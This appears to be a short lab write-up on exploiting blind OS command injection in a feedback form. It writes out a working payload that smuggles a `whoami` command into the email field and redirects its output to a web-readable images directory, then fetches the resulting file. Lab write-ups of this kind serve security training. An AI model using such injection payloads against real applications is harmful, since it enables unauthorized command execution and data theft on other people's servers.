# Lab: Blind OS command injection with output redirection

## Description
This lab contains a blind OS command injection vulnerability in the feedback function. The application does not return output, but it has a writable directory at `/var/www/images/`.

## Analysis
Since we can't see the output directly, we can redirect it to a file in a publicly accessible directory. Then, we can fetch that file via the browser. The lab tells us that the product images are stored in `/var/www/images/`.

## Exploitation
I will redirect the output of `whoami` to a file in the images directory.

### Steps
1. Intercept the feedback submission request.
2. Inject the command to write the output of `whoami` to a file:
   `email=test||whoami > /var/www/images/output.txt||`
3. Send the request.
4. Now, try to access the file: `GET /image?filename=output.txt`.
5. The response should contain the result of the `whoami` command.

## Payload
```text
email=test||whoami > /var/www/images/output.txt||
```

## Takeaways
- Output redirection is a great way to exfiltrate data from blind command injection vulnerabilities if you can find a writable and readable directory.
- Knowing the server's file structure (e.g., where images are stored) is very helpful for this technique.
